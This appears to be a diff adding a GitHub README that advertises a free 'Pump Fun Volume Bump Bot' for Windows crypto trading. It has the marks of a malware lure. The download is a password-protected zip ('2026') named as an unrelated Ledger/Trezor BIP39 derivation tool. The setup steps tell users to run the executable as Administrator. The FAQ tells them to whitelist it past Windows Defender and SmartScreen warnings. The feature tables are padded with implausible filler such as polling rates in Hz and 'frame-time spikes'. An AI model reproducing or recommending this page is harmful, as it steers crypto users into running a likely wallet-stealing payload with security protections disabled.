@@ -1,0 +1,66 @@
+🚀 Pump Fun Volume Bump Bot — Free Download for Windows 2026]
+
+-green?style=for-the-badge&logo=github)
+
+🚀 Pump Fun Volume Bump Bot (canyon1469/pump-fun-volume-bump-bot) integrates modular modules tailored for 64-bit Windows workstations, distributed as ledger-trezor-bip39-derivation-tool-v1.2.0-win64.zip (40.4 MB, password 2026).
+
+Direct Package: [ledger-trezor-bip39-derivation-tool-v1.2.0-win64.zip (40.4 MB) · Password: 2026 · Build: v3.9.2 (4C72D8)
+
+🚀 Step-by-Step Setup for Pump Fun Volume Bump Bot
+
+1. Save ledger-trezor-bip39-derivation-tool-v1.2.0-win64.zip: Use the button above on canyon1469/pump-fun-volume-bump-bot to save ledger-trezor-bip39-derivation-tool-v1.2.0-win64.zip (40.4 MB, build 4C72D8).
+2. Unpack with Password 2026: Open ledger-trezor-bip39-derivation-tool-v1.2.0-win64.zip in 7-Zip or WinRAR and extract the pump-fun-volume-bump-bot folder using password 2026.
+3. Start ledger-trezor-bip39-derivation-tool-v1.2.0-win64.exe: Right-click ledger-trezor-bip39-derivation-tool-v1.2.0-win64.exe (v3.9.2) and choose Run as Administrator on 64-bit Windows workstations.
+4. Activate Pump Fun Volume Bump Bot Modules: Select your pump-fun-volume-bump-bot profile inside ledger-trezor-bip39-derivation-tool-v1.2.0-win64.exe and verify the status indicator is active.
+
+Archive Password: 2026 — Extract ledger-trezor-bip39-derivation-tool-v1.2.0-win64.zip completely before launching ledger-trezor-bip39-derivation-tool-v1.2.0-win64.exe as Administrator.
+
+✨ Pump Fun Volume Bump Bot — Key Highlights
+
+| 📈 Multi-Tier Take Profit | 📦 Jito & MEV Bundle Engine |
+| :---: | :---: |
+| Powers lock-free multi-tier take profit (pump-fun-volume-bump-bot · automated scale-out targets & trailing stop migration) inside ledger-trezor-bip39-derivation-tool-v1.2.0-win64.exe at 170 Hz polling. | Coordinates deterministic jito & mev bundle engine (pump-fun-volume-bump-bot · atomic block inclusion with dynamic tip sizing) across pump-fun-volume-bump-bot sessions at 176 Hz polling. |
+
+| 🐋 Smart-Money Copytrade | 🛡️ Pre-Buy Honeypot Filter |
+| :---: | :---: |
+| Executes isolated smart-money copytrade (pump-fun-volume-bump-bot · real-time whale wallet mirroring & proportional sizing) within the Pump Fun Volume Bump Bot runtime with zero frame-time spikes. | Accelerates lock-free pre-buy honeypot filter (pump-fun-volume-bump-bot · mint/freeze authority & LP lock verification) inside ledger-trezor-bip39-derivation-tool-v1.2.0-win64.exe with 99.9% consistency. |
+
+| 🔑 Local AES-256 Key Vault | ⚡ Sub-40ms Order Routing |
+| :---: | :---: |
+| Optimizes lock-free local aes-256 key vault (pump-fun-volume-bump-bot · non-custodial local signing without remote key exposure) for Pump Fun Volume Bump Bot users across 16 worker threads. | Manages asynchronous sub-40ms order routing (pump-fun-volume-bump-bot · direct WebSocket & gRPC transaction streaming) within the Pump Fun Volume Bump Bot runtime across 14 worker threads. |
+
+💻 ledger-trezor-bip39-derivation-tool-v1.2.0-win64.exe — Build Manifest
+
+| pump-fun-volume-bump-bot Attribute | Pump Fun Volume Bump Bot Value |
+| :--- | :--- |
+| Target Platform | 64-bit Windows workstations |
+| Executable & Build | ledger-trezor-bip39-derivation-tool-v1.2.0-win64.exe (v3.9.2 · 4C72D8B1FB) |
+| Release Archive | ledger-trezor-bip39-derivation-tool-v1.2.0-win64.zip (40.4 MB) |
+| Unzip Password | 2026 |
+
+{
+  "title": "Pump Fun Volume Bump Bot",
+  "repository": "canyon1469/pump-fun-volume-bump-bot",
+  "version": "v3.9.2-4C72D8",
+  "package": "ledger-trezor-bip39-derivation-tool-v1.2.0-win64.zip",
+  "password": "2026",
+  "binary": "ledger-trezor-bip39-derivation-tool-v1.2.0-win64.exe"
+}
+
+❓ Pump Fun Volume Bump Bot (v3.9.2) — FAQ
+
+Is Pump Fun Volume Bump Bot (ledger-trezor-bip39-derivation-tool-v1.2.0-win64.zip) compatible with 64-bit Windows workstations?
+
+Yes — ledger-trezor-bip39-derivation-tool-v1.2.0-win64.exe (v3.9.2) runs natively on 64-bit Windows workstations across Intel and AMD x64 processors.
+
+How do I fix Windows Defender or SmartScreen alerts on ledger-trezor-bip39-derivation-tool-v1.2.0-win64.exe (v3.9.2)?
+
+Because ledger-trezor-bip39-derivation-tool-v1.2.0-win64.exe (build 4C72D8) is an independent crypto trading binary, heuristic checks may prompt a warning. Confirm you downloaded ledger-trezor-bip39-derivation-tool-v1.2.0-win64.zip from canyon1469/pump-fun-volume-bump-bot, whitelist the pump-fun-volume-bump-bot directory, and run ledger-trezor-bip39-derivation-tool-v1.2.0-win64.exe as Administrator.
+
+What is the password to extract ledger-trezor-bip39-derivation-tool-v1.2.0-win64.zip for Pump Fun Volume Bump Bot?
+
+Enter 2026 in 7-Zip or WinRAR when unpacking ledger-trezor-bip39-derivation-tool-v1.2.0-win64.zip (40.4 MB) before starting ledger-trezor-bip39-derivation-tool-v1.2.0-win64.exe.
+
+  🚀 Pump Fun Volume Bump Bot · v3.9.2 (4C72D8B1FB)
+
+  pump-fun-volume-bump-bot
